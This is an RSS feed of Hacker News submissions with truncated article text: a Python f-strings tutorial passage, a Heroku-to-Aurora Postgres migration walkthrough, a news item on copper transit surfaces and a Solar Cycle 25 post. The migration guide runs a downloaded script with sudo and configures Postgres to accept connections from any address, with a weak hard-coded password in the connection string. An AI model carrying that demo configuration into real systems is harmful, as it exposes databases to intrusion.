<p>As I have shown in the previous section, formatting a string using f-strings is quite straightforward. The sole requirement is to provide it a valid expression. f-strings can also start with capital <code>F</code> and you can combine with raw strings. However, you cannot mix them with bytes <code>b""</code> or <code>"u"</code>.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603916687914/zA7xXR7UF.png?auto=format&amp;q=60" alt="fig_5.png"></p>
<pre><code><span>&gt;&gt;&gt; </span>book = <span>"The dog guide"</span>

<span>&gt;&gt;&gt; </span>num_pages = <span>124</span>

<span>&gt;&gt;&gt; </span><span>f"The book <span>{book}</span> has <span>{num_pages}</span> pages"</span>
<span>'The book The dog guide has 124 pages'</span>

<span>&gt;&gt;&gt; </span>F<span>"The book {book} has {num_pages} pages"</span>
<span>'The book The dog guide has 124 pages'</span>

<span>&gt;&gt;&gt; </span>print(F<span>r"The book {book} has {num_pages} pages\n"</span>)
The book The dog guide has <span>124</span> pages\n

<span>&gt;&gt;&gt; </span>print(FR<span>"The book {book} has {num_pages} pages\n"</span>)
The book The dog guide has <span>124</span> pages\n

<span>&gt;&gt;&gt; </span>print(<span>f"The book <span>{book}</span> has <span>{num_pages}</span> pages\n"</span>)
The book The dog guide has <span>124</span> pages
</code></pre>
<p>And that's pretty much it! In the next section, I'll show you several examples of everything you can do - and cannot do - with f-strings.</p>
<h2 id="limitations">Limitations</h2>
<p>Even though f-strings are very convenient, they don't replace <code>str.format</code> completely. f-strings evaluate expressions in the context where they appear. According the the  <a href="#https://www.python.org/dev/peps/pep-0498/">PEP 498
</a>, this means the expression has full access to local and global variables. They're also an expression evaluated at runtime. If the expression used inside the <code>{ &lt;expr&gt; }</code> cannot be evaluated, the interpreter will raise an exception.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"<span>{name}</span>"</span>
---------------------------------------------------------------------------
NameError                                 Traceback (most recent call last)
&lt;ipython-input<span>-1</span>-f0acc441190f&gt; <span>in</span> &lt;module&gt;
----&gt; <span>1</span> <span>f"<span>{name}</span>"</span>

NameError: name <span>'name'</span> <span>is</span> <span>not</span> defined
</code></pre>
<p>This is not a problem for the <code>str.format</code> method, as you can define the template string and then call <code>.format</code> to pass on the context.</p>
<pre><code><span>&gt;&gt;&gt; </span>s = <span>"{name}"</span>

<span>&gt;&gt;&gt; </span>s.format(name=<span>"Python"</span>)
<span>'Python'</span>

<span>&gt;&gt;&gt; </span>print(s)
{name}
</code></pre>
<p>Another limitation is that you cannot use inline comments inside a f-string.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"My name is <span>{name #name}</span>!"</span>
  File <span>"&lt;ipython-input-37-0ae1738dd871&gt;"</span>, line <span>1</span>
    <span>f"My name is <span>{name #name}</span>!"</span>
    ^
SyntaxError: f-string expression part cannot include <span>'#'</span>
</code></pre>
<h2 id="how-to-format-an-expression">How to Format an Expression</h2>
<p>If you don't want to define variables, you can use literals inside the brackets. Python will evaluate the expression and display the final result.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f"4 * 4 is <span>{<span>4</span> * <span>4</span>}</span>"</span>
<span>'4 * 4 is 16'</span>
</code></pre>
<p>Or if you prefer...</p>
<pre><code><span>&gt;&gt;&gt; </span>n = <span>4</span>

<span>&gt;&gt;&gt; </span><span>f"4 * 4 is <span>{n * n}</span>"</span>
<span>'4 * 4 is 16'</span>
</code></pre>
<h2 id="how-to-use-f-strings-to-debug-your-code">How to Use F-Strings to Debug Your Code</h2>
<p>One of most frequent usages of f-string is debugging. Before Python 3.8, many people would do <code>hello = 42; f"hello = {hello}"</code>, but this is very repetitive. As a result, Python 3.8 brought a new feature. You can re-write that expression as <code>f"{hello=}"</code> and Python will display <code>hello=42</code>. The following example illustrates this using a function, but the principle is the same.</p>
<pre><code><span>&gt;&gt;&gt; </span><span><span>def</span> <span>magic_number</span>():</span>
     ...:     <span>return</span> <span>42</span>
     ...: 

<span>&gt;&gt;&gt; </span><span>f"<span>{magic_number() = }</span>"</span>
<span>'magic_number() = 42'</span>
</code></pre>
<h2 id="how-to-format-integers-in-different-bases">How to Format Integers in Different Bases</h2>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1603918242247/zSDHIu-F8.png?auto=format&amp;q=60" alt="fig_6.png"></p>
<p>f-strings also allow you to display an integer in different bases. For example, you can display an <code>int</code> as binary without converting it by using the <code>b</code> option.</p>
<pre><code><span>&gt;&gt;&gt; </span><span>f'<span>{<span>7</span>:b}</span>'</span>
<span>'111'</span>
</code></pre>
<p>In summary, you can use f-strings to format: </p>
<ul>
<li><code>int</code> to binary</li>
<li><code>int</code> to hex</li>
<li><code>int</code> to octal</li>
<li><code>int</code> to HEX (where all chars are capitalized)</li>
</ul>
<p>The following example uses the padding feature and the base formatting to create a table that displays an <code>int</code> in other bases.</p>
<pre><code><span>&gt;&gt;&gt; </span>bases = {
       <span>"b"</span>: <span>"bin"</span>, 
       <span>"o"</span>: <span>"oct"</span>, 
       <span>"x"</span>: <span>"hex"</span>, 
       <span>"X"</span>: <span>"HEX"</span>, 
       <span>"d"</span>: <span>"decimal"</span>
}
<span>&gt;&gt;&gt; </span><span>for</span> n <span>in</span> range(<span>1</span>, <span>21</span>):
     ...:     <span>for</span> base, desc <span>in</span> bases.items():
     ...:         print(<span>f"<span>{n:<span>5</span>{base}</span>}"</span>, end=<span>' '</span>)
     ...:     print()

    <span>1</span>     <span>1</span>     <span>1</span>     <span>1</span>     <span>1</span> 
   <span>10</span>     <span>2</span>     <span>2</span>     <span>2</span>     <span>2</span> 
   <span>11</span>     <span>3</span>     <span>3</span>     <span>3</span>     <span>3</span> 
  <span>100</span>     <span>4</span>     <span>4</span>     <span>4</span>     <span>4</span> 
  <span>101</span>     <span>5</span>     <span>5</span>     <span>5</span>     <span>5</span> 
  <span>110</span>     <span>6</span>     <span>6</span>     <span>6</span>     <span>6</span> 
  <span>111</span>     <span>7</span>     <span>7</span>     <span>7</span>     <span>7</span> 
 <span>1000</span>    <span>10</span>     <span>8</span>     <span>8</span>     <span>8</span> 
 <span>1001</span>    <span>11</span>     <span>9</span>     <span>9</span>     <span>9</span> 
 <span>1010</span>    <span>12</span>     a     A    <span>10</span> 
 <span>1011</span>    <span>13</span>     b     B    <span>11</span> 
 <span>1100</span>    <span>14</span>     c     C    <span>12</span> 
 <span>1101</span>    <span>15</span>     d     D    <span>13</span> 
 <span>1110</span>    <span>16</span>     e     E    <span>14</span> 
 <span>1111</span>    <span>17</span>     f     F    <span>15</span> 
<span>10000</span>    <span>20</span>    <span>10</span>    <span>10</span>    <span>16</span> 
<span>10001</span>    <span>21</span>    <span>11</span>    <span>11</span>    <span>17</span> 
<span>10010</span>    <span>22</span>    <span>12</span>    <span>12</span>    <span>18</span> 
<span>10011</span>    <span>23</span>    <span>13</span>    <span>13</span>    <span>19</span> 
<span>10100</span>    <span>24</span>    <span>14</span>    <span>14</span>    <span>20</span>
</code></pre>
<h2 id="how-to-print-objects-with-f-strings">How to Print Objects With F-Strings</h2>
<p>You can print custom objects using f-strings. By default, when you pass an object instance to a f-string, it will display what the <code>__str__</code> method returns. However, you can also use the <a target="_blank" href="https://www.python.org/dev/peps/pep-3101/#explicit-conversion-flag">explicit conversion flag</a> to display the <code>__repr__</code>.</p>
<pre><code>!r - converts the <span>value</span> <span>to</span> a string <span>using</span> repr().
!s - converts the <span>value</span> <span>to</span> a string <span>using</span> str().
</code></pre><pre><code><span>&gt;&gt;&gt; </span><span><span>class</span> <span>Color</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self, r: float = <span>255</span>, g: float = <span>255</span>, b: float = <span>255</span></span>):</span>
        self.r = r
        self.g = g
        self.b = b

    <span><span>def</span> <span>__str__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>"A RGB color"</span>

    <span><span>def</span> <span>__repr__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>)"</span>

<span>&gt;&gt;&gt; </span>c = Color(r=<span>123</span>, g=<span>32</span>, b=<span>255</span>)


<span>&gt;&gt;&gt; </span><span>f"<span>{c}</span>"</span>
<span>'A RGB color'</span>


<span>&gt;&gt;&gt; </span><span>f"<span>{c!r}</span>"</span>
<span>'Color(r=123, g=32, b=255)'</span>


<span>&gt;&gt;&gt; </span><span>f"<span>{c!s}</span>"</span>
<span>'A RGB color'</span>
</code></pre>
<p>Python also allows us to <a target="_blank" href="https://www.python.org/dev/peps/pep-3101/#controlling-formatting-on-a-per-type-basis">control the formatting on a per-type basis</a>  through the <code>__format__</code> method. The following example shows how you can do all of that.</p>
<pre><code><span>&gt;&gt;&gt; </span><span><span>class</span> <span>Color</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self, r: float = <span>255</span>, g: float = <span>255</span>, b: float = <span>255</span></span>):</span>
        self.r = r
        self.g = g
        self.b = b

    <span><span>def</span> <span>__str__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>"A RGB color"</span>

    <span><span>def</span> <span>__repr__</span>(<span>self</span>) -&gt; str:</span>
        <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>)"</span>

    <span><span>def</span> <span>__format__</span>(<span>self, format_spec: str</span>) -&gt; str:</span>
        <span>if</span> <span>not</span> format_spec <span>or</span> format_spec == <span>"s"</span>:
            <span>return</span> str(self)

        <span>if</span> format_spec == <span>"r"</span>:
            <span>return</span> repr(self)

        <span>if</span> format_spec == <span>"v"</span>:
            <span>return</span> <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) - A nice RGB thing."</span>

        <span>if</span> format_spec == <span>"vv"</span>:
            <span>return</span> (
                <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) "</span>
                <span>f"- A more verbose nice RGB thing."</span>
            )

        <span>if</span> format_spec == <span>"vvv"</span>:
            <span>return</span> (
                <span>f"Color(r=<span>{self.r}</span>, g=<span>{self.g}</span>, b=<span>{self.b}</span>) "</span>
                <span>f"- A SUPER verbose nice RGB thing."</span>
            )

        <span>raise</span> ValueError(
            <span>f"Unknown format code '<span>{format_spec}</span>' "</span> <span>"for object of type 'Color'"</span>
        )

<span>&gt;&gt;&gt; </span>c = Color(r=<span>123</span>, g=<span>32</span>, b=<span>255</span>)

<span>&gt;&gt;&gt; </span><span>f'<span>{c:v}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:vv}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A more verbose nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:vvv}</span>'</span>
<span>'Color(r=123, g=32, b=255) - A SUPER verbose nice RGB thing.'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c}</span>'</span>
<span>'A RGB color'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:s}</span>'</span>
<span>'A RGB color'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:r}</span>'</span>
<span>'Color(r=123, g=32, b=255)'</span>

<span>&gt;&gt;&gt; </span><span>f'<span>{c:j}</span>'</span>
---------------------------------------------------------------------------
ValueError                                Traceback (most recent call last)
&lt;ipython-input<span>-20</span><span>-1</span>c0ee8dd74be&gt; <span>in</span> &lt;module&gt;
----&gt; <span>1</span> <span>f'<span>{c:j}</span>'</span>

&lt;ipython-input<span>-15</span><span>-985</span>c4992e957&gt; <span>in</span> __format__(self, format_spec)
     <span>29</span>                 <span>f"- A SUPER verbose nice RGB thing."</span>
     <span>30</span>             )
---&gt; <span>31</span>         <span>raise</span> ValueError(
     <span>32</span>             <span>f"Unknown format code '<span>{format_spec}</span>' "</span> <span>"for object of type 'Color'"</span>
     <span>33</span>         )

ValueError: Unknown format code <span>'j'</span> <span>for</span> object of type <span>'Color'</span>
</code></pre>
<p>Lastly, there's also the <code>a</code> option that escapes non-ASCII chars. For more info: <a href="https://docs.python.org/3/library/functions.html#ascii" target="_blank">docs.python.org/3/library/functions.html#as..</a></p>
<pre><code><span>&gt;&gt;&gt; </span>utf_str = <span>"Áeiöu"</span>

<span>&gt;&gt;&gt; </span><span>f"<span>{utf_str!a}</span>"</span>
<span>"'\\xc1ei\\xf6u'"</span>
</code></pre>
<h2 id="how-to-set-float-number-precision-in-a-f-string">How to Set Float Number Precision in a F-String</h2>
<p>f-strings allow format float numbers similar to <code>str.format</code> method. To do that, you can add a <code>:</code> (colon) followed by a <code>.</code> (dot) and the number of decimal places with a <code>f</code> suffix. </p>
<p>For…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings">https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings</a></em></p>]]>
            </description>
            <link>https://miguendes.me/73-examples-to-help-you-master-pythons-f-strings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071504</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Migrating Large Heroku Postgres Instances to AWS Aurora Without Downtime]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 37 (<a href="https://news.ycombinator.com/item?id=25071502">thread link</a>) | @sciguymcq
<br/>
November 12, 2020 | https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/ | <a href="https://web.archive.org/web/*/https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
        <div>
          
          

          
          
          <h3>Introduction</h3>
<p>In this article I discuss a general process I used recently to migrate a large multi-terabyte Heroku Postgres Database from the Heroku Platform to Amazon Aurora Postgres on a live Heroku based application architecture with near zero downtime and builtin failovers during the process. Not only did this migration save significant costs associated with running a large managed Postgres instance it also resulted in increased scalability and flexibility of parameter turing and other management abilities afforded by AWS RDS.</p>

<h4>Contents</h4>
<ul>
<li><a title="Heroku Architecture and Constraints" href="#heroku-architecture-and-constraints">Heroku Architecture and Constraints</a></li>
<li><a title="The RandoNumba Demo App" href="#rando-numba-demo-app">The RandoNumba Demo App</a></li>
<li><a title="Mimicing the Heroku Postgres Service" href="#mimicing-heroku-postgres">Mimicking the Heroku Postgres Service</a></li>
<li><a title="Restore and Promote EC2 Postgres Log Shipped Replica" href="#log-shipped-replica">Restore and Promote EC2 Postgres Log Shipped Replica</a></li>
<li><a title="Create EC2 Postgres Log Streamed Replica" href="#log-streamed-replica">Create EC2 Postgres Log Streamed Replica</a></li>
<li><a title="Switch App Dyno to Promoted EC2 Postgres" href="#switch-to-log-shipped-replica">Switch App Dyno to Promoted EC2 Postgres</a></li>
<li><a title="Initiate Postgres Logical Replication to Aurora Postgres" href="#initiate-logical-replication-to-aurora">Initiate Postgres Logical Replication to Aurora Postgres</a></li>
<li><a title="Switch App Dyno to Aurora Postgres" href="#switch-to-aurora-postgres">Switch App Dyno to Aurora Postgres</a></li>
</ul>
<h3><a id="heroku-architecture-and-constraints"></a>Heroku Architecture and Constraints</h3>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/Heroku-Postgres-Migration.jpg" alt="Heroku Migration Diagram" width="991" height="733"></p>
<p>The Heroku Postgres Migration to AWS Aurora Postgres Architecture and Process Flow diagram above shows, at a high level, the Heroku Postgres Data Layer Architecture for a typical Heroku Premium Level Service with High Availability plus a Read Replica for load balancing Read heavy apps. Then on the right is the migration target goal within the AWS platform boundary annotated with the sequence of steps used to migrate the data to the Aurora Postgres instance.</p>
<p>Before I get into discussing the constraints that I've experienced I would like to put forth an important disclaimer. The Heroku platform is a phenominally innovative service that has paved the way for developing countless extremely useful and profitable apps and services by lowering the barrier to entry for small development teams. Many, if not most, apps will not hit the constraints that I point out below alleviating the need for a migration of their data layer off the platform.</p>
<ul>
<li>Heroku can be costly, perhaps for good reasons, because they alleviate much of the sysops / devops investment and dev time costs of maintaining and scaling services like Postgres</li>
<li>Heroku Postgres locks down the majority of the Postgres parameters that are often necessary to tune for large enterprise level, high throughput, Postgres usage</li>
<li>Heroku Postgres monitoring falls well short of many of the other options, particularly AWS RDS, which becomes very important for large enterprise grade applications</li>
<li>Heroku Postgres does not allow Postgres superuser or Replication User roles so migration options become limited</li>
<li>Postgres pg_dump / pg_restore is not a viable option for large databases of a terabyte and up because of the amount of time it requires to run and thus inherently implies down time or data loss if used as an option for failover or migration which isn't possible for most applications</li>
</ul>

<h3><a id="rando-numba-demo-app"></a>The RandoNumba Demo App</h3>
<p>To faciltate this discussion I've provided a toy app that is deployable to Heroku and built using the Django web framework which simply generates random numbers and scrapes quotes from the web.</p>
<p>1) Clone dj-randonumba-heroku app from my GitHub repo</p>
<pre><code>git clone https://github.com/amcquistan/dj-randonumba-heroku.git
cd dj-randonumba-heroku
</code></pre>
<p>2) Create a Heroku App</p>
<pre><code>heroku create</code></pre>
<p>giving the following output but, note you're output will give a different app name and url</p>
<pre><code>Creating app... done, ⬢ intense-headland-79519
https://intense-headland-79519.herokuapp.com/ | https://git.heroku.com/intense-headland-79519.git</code></pre>
<p>Be sure to update `randonumba.settings.ALLOWED_HOSTS` to include the host that Heroku provides.</p>
<p>3) Push the App Code to Heroku</p>
<pre><code>git push heroku master</code></pre>
<p>4) Attach a free tier Heroku Postgres Add on for Demo Purposes</p>
<pre><code>heroku addons:create heroku-postgresql:hobby-dev -a intense-headland-79519</code></pre>
<p>Use psql to create the hstore Postgres extension this demo app uses</p>
<pre><code>heroku pg:psql -a intense-headland-79519
create extension hstore;
\q</code></pre>
<p>then run migrations</p>
<pre><code>heroku run python manage.py migrate -a intense-headland-79519</code></pre>
<p>5) Register and Play with the App</p>
<p>Open the app in your default browser with the following (replace -a intense-headland-79519 with your app name).</p>
<pre><code>heroku open -a intense-headland-79519</code></pre>
<p>Then register the app and generate some randomness</p>
<p><img src="https://thecodinginterface-images.s3.amazonaws.com/blogposts/heroku-postgres-migration/rando-numba-randomness.png" alt="" width="1838" height="948"></p>

<h3><a id="mimicing-heroku-postgres"></a>Mimicking the Heroku Postgres Service</h3>
<p>In the Real World for this process to work you need to request for the Heroku Data Support team to establish continuous WAL log shipping to an AWS S3 bucket along with a base physical backup using the <a title="WAL-E Python based library" href="https://github.com/wal-e/wal-e" target="_blank" rel="noopener">WAL-E Python based library</a>. Rather than bothering Heroku's Data Support team for this demo and to allow readers to fully reproduce the demo I will simply mimick this step with my own AWS EC2 instance running Postgres 11 and shipping a continuous archive to my own AWS S3 bucket.</p>
<h4>Infrastructure Specs and Services</h4>
<ul>
<li>Amazon Linux 2 AMI</li>
<li>Security Group Allowing port 5432 and SSH access</li>
<li>Separate EBS Volume for Installing the Postgres DB Cluster</li>
<li>S3 Bucket for Pushing Base Physical Backup and WAL</li>
<li>IAM User with Programmatic Access to S3</li>
</ul>
<h4>Procedure for Mimicking Heroku Postgres</h4>
<p>1) Update VPS (Virtual Private Server) and Install Dependencies</p>
<pre><code>sudo yum update -y
sudo amazon-linux-extras install epel -y
sudo amazon-linux-extras install postgresql11 -y
sudo yum install postgresql-server postgresql-contrib python3 lzop pv -y
curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
sudo python3 -m pip install envdir wal-e[aws]</code></pre>
<p>2) Mount Volume and Create File System for Postgres Cluster</p>
<p>Use lsblk to identify the EBS volume to install Postgres Cluster on</p>
<pre><code>$ lsblk
NAME    MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
xvda    202:0    0   8G  0 disk
└─xvda1 202:1    0   8G  0 part /
xvdb    202:16   0  16G  0 disk</code></pre>
<p>Format volume as a XFS filesystem.</p>
<pre><code>sudo mkfs -t xfs /dev/xvdb</code></pre>
<p>Create a mount point for the volume and mount it to the new directory.</p>
<pre><code>sudo mkdir /database
sudo mount /dev/xvdb /database</code></pre>
<p>Find the device's block id and make the mount permanent in /etc/fstab</p>
<pre><code>sudo blkid # will give you the block id </code></pre>
<p>example entry in /etc/fstab</p>
<pre><code>UUID=19ee2212-7fa0-4c9a-bcbf-cd7019d50fd6     /database   xfs    defaults,nofail   0   2</code></pre>
<p>Test the mount (no errors is the successful outcome).</p>
<pre><code>sudo mount -a</code></pre>
<p>Update permissions of the /database directory for postgres.</p>
<pre><code>sudo chown -R postgres:postgres /database
sudo chmod -R 700 /database</code></pre>
<p>3) Create envdir Directory for AWS Creds used for WAL-E</p>
<pre><code>sudo mkdir -p /etc/wal-e/env
sudo chown -R ec2-user:ec2-user /etc/wal-e
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_ACCESS_KEY_ID
echo "REGION-HERE" &gt; /etc/wal-e/env/AWS_REGION
echo "INSERT-VALUE-HERE" &gt; /etc/wal-e/env/AWS_SECRET_ACCESS_KEY
echo "S3-BUCKET-FOLDER-URL-HERE" &gt; /etc/wal-e/env/WALE_S3_PREFIX
sudo chown -R postgres:postgres /etc/wal-e
sudo chmod -R 755 /etc/wal-e/env</code></pre>
<p>4) Initialize Postgres Cluster</p>
<p>Run as postgres user.</p>
<pre><code>pg_ctl init -D /database</code></pre>
<p>5) Modify Postgres Configs</p>
<p>First modify /database/postgresql.conf with the following.</p>
<pre><code>listen_addresses = '*' or your apps specific IP
wal_level = replica
archive_mode = on
archive_command = 'envdir /etc/wal-e/env wal-e wal-push %p'
archive_timeout = 60</code></pre>
<p>Update /database/pg_hba.conf for auth (substiture 0.0.0.0/0 with your APPs IP as necessary).</p>
<pre><code>host    pgdb            pguser          0.0.0.0/0               md5</code></pre>
<p>6) Start and Enable Postgres Service</p>
<p>First create a systemd service file for managing the postgresql service in /etc/systemd/system/postgresql.service</p>
<pre><code>.include /lib/systemd/system/postgresql.service

[Service]
Environment=PGDATA=/database
</code></pre>
<p>Reload systemd, start and enable postgresql service</p>
<pre><code>sudo systemctl daemon-reload
sudo systemctl start postgresql
sudo systemctl status postgresql
sudo systemctl enable postgresql</code></pre>
<p>7) Create App Postgres User and Database</p>
<pre><code>createuser -e -l --pwprompt pguser
createdb -e --owner=pguser pgdb</code></pre>
<p>Make hstore extension</p>
<pre><code>psql -d pgdb
create extension hstore;
\q</code></pre>
<p>8) Detach Heroku Postgres Addon and Switch Connection String to EC2 Instance</p>
<p>Note that this is ran locally not on the Amazon EC2 VPS</p>
<p>List addons to get name of Heroku Postgres</p>
<pre><code>heroku addons</code></pre>
<p>Detach the addon for Heroku Postgres</p>
<pre><code>heroku addons:detach name-of-addon -a name-of-heroku-app</code></pre>
<p>Replace the DATABASE_URL config variable to point to the newly spun up EC2 Postgres instance mimicking Heroku Postgres</p>
<pre><code>heroku config:set DATABASE_URL=postgres://pguser:develop3r@ec2-ip-address:5432/pgdb -a name-of-heroku-app
heroku ps:restart -a name-of-heroku-app</code></pre>
<p>Run migrations.</p>
<pre><code>heroku run python manage.py migrate -a name-of-heroku-app</code></pre>
<p>At this point you'll want to register a new user and generate some more test data to migrate. You could also use pg_dump / pg_restore to transfer any existing data from Heroku Postgres to this new EC2 Postgres instance being used to mimic Heroku Postgres</p>
<p><br>9) Push Base Backup to S3 Using WAL-E</p>
<p>Note that tests next commands are to be ran on the Amazon Linux VPS.</p>
<p>As a personal preference I like to wrap potentially long running commands in shell scripts so I can explicitly echo out when things begin and end then to protect against SSH connections from timing out during potentially long running processes I use nohup with backgrounding.</p>
<p>For this I create the following script</p>
<pre><code>mkdir /var/lib/pgsql/scripts &amp;&amp; cd /var/lib/pgsql/scripts
vi wal-e-push-backup.sh</code></pre>
<p>with contents</p>
<pre><code>#!/bin/bash

echo "starting wal-e backup-push"

envdir /etc/wal-e/env wal-e backup-push /database

echo "wal-e backup-push complete"
</code></pre>
<p>Run it.</p>
<pre><code>nohup ./wal-e-push-backup.sh &amp;</code></pre>
<p>After the push finishes I should be able to verify that the backup has been pushed with the following command.</p>
<pre><code>envdir /etc/wal-e/env wal-e backup-list</code></pre>
<p>At this point I have an EC2 Instance with Postgres installed mimicking Heroku Postgres and continuously shipping backups and WAL to S3.</p>
<h3><a id="log-shipped-replica"></a>Restore and Promote EC2 Postgres Log Shipped Replica</h3>
<p>In the real world this is where you will start, that is by creating your log shipped replica loaded from data in S3 in the form of a physical base backup and WAL files. The Heroku Data Support team will likely provide you with S3 creds for WAL-E in the form of Heroku config variables which you can …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/">https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</a></em></p>]]>
            </description>
            <link>https://thecodinginterface.com/blog/heroku-postgres-migration-to-aurora/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071502</guid>
            <pubDate>Thu, 12 Nov 2020 16:27:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Covid-Busting Copper Surfaces]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071396">thread link</a>) | @colinprince
<br/>
November 12, 2020 | https://www.cbc.ca/news/canada/british-columbia/covid-busting-copper-surfaces-coming-to-a-bus-or-skytrain-near-you-1.5797094 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/news/canada/british-columbia/covid-busting-copper-surfaces-coming-to-a-bus-or-skytrain-near-you-1.5797094">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>TransLink is introducing copper surfaces to a handful of buses and SkyTrain cars is an pilot project to test the natural anti-microbial properties of the metal in a transit setting.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5797507.1605046150!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/translink-copper-surfaces.jpg"></p></div><figcaption>The TransLink copper-surfaces pilot will roll out on two SkyTrain cars and two electric trolley buses.<!-- --> <!-- -->(TransLink)</figcaption></figure><p><span><p>When most people think of copper, they picture pennies, pots and batteries.</p>  <p>But&nbsp;the shiny brown metal also has pandemic busting, self-sanitizing powers that have&nbsp;caught the attention of TransLink during the time of COVID-19.</p>  <p>Copper, as it turns out, has anti-microbial&nbsp;qualities that could make it an important piece of the puzzle for safeguarding riders&nbsp;if applied to high touch surfaces&nbsp;like the poles people hang on to when taking transit.&nbsp;</p>  <p>In a new pilot project,&nbsp;Teck Resources is providing&nbsp;$90,000 to install copper surfaces on&nbsp;two busy electric trolley&nbsp;buses and on two SkyTrain cars running on the Expo and Millennium lines.</p>  <p>"This is an example of testing out new technology and innovation," said outgoing TransLink CEO Kevin Desmond. "Hopefully this has legs."</p>    <p>According to an&nbsp;infectious&nbsp;disease expert with Vancouver Coastal Health, copper can kill bacteria and viruses on contact.</p>  <p>"It can create a situation where it breaks through the membrane of the microorganism, causing&nbsp;leakage and ultimately the death of the microorganism,"&nbsp;said Dr. Marthe Charles.</p>  <p>Charles said the transit study is a continuation of research already taking place at local hospitals. Three copper surfaces and an antimicrobial surface treatment will be tested during the four-week&nbsp;pilot.&nbsp;</p>  <p>The project is the first of its kind for a North American transit system.</p>  <p>Desmond said TransLink ridership has plateaued since the summer and remains at around 43 per cent of pre-pandemic levels.&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/british-columbia/covid-busting-copper-surfaces-coming-to-a-bus-or-skytrain-near-you-1.5797094</link>
            <guid isPermaLink="false">hacker-news-small-sites-25071396</guid>
            <pubDate>Thu, 12 Nov 2020 16:19:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[RF Enthusiasts Rejoice – Solar Cycle 25 Has Officially Begun]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25071342">thread link</a>) | @themoralone
<br/>
November 12, 2020 | http://k0lwc.com/solar-cycle-25-has-officially-begun/ | <a href="https://web.archive.org/web/*/http://k0lwc.com/solar-cycle-25-has-officially-begun/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-414">
	<!-- .entry-header -->

	<div>
		
<p>Ham radios operators around the world rejoice — Solar Cycle 25 has officially begun! The Royal Observatory of Belgium has reported the solar minimum likely occurred in December of 2019.&nbsp;The solar minimum marks the lowest point of sunspot activity and is the official start of a new cycle.</p>



<p>Amateur radio and shortwave enthusiasts alike have been living with the tail end of a weak solar cycle for years. This means signals on High Frequency (HF) bands have not been good, but that’s now changing and will continue to improve for years to come.</p>



<p>Quote</p>



<blockquote><p>In January 2020, the<a target="_blank" href="http://sidc.be/silso/monthlyssnplot" rel="noreferrer noopener">&nbsp;<em>13-month smoothed sunspot number</em></a>&nbsp;rose for the first time since the maximum of cycle 24 (April 2014). Now, by September 2020, this reversal of the trend was firmly confirmed, officially placing&nbsp;<strong>the minimum between cycles 24 and 25 in December 2019</strong>.</p><cite>Royal Observatory, Belgium.</cite></blockquote>



<p>Solar Cycle 24 had the fourth-smallest intensity since regular record-keeping began with Solar Cycle 1 in 1755. It was also the weakest cycle in a century. Scientists&nbsp;<a target="_blank" href="https://www.swpc.noaa.gov/news/solar-cycle-25-forecast-update" rel="noreferrer noopener">forecast</a>&nbsp;that Solar Cycle 25 will be a fairly weak one, similar to Solar Cycle 24.</p>



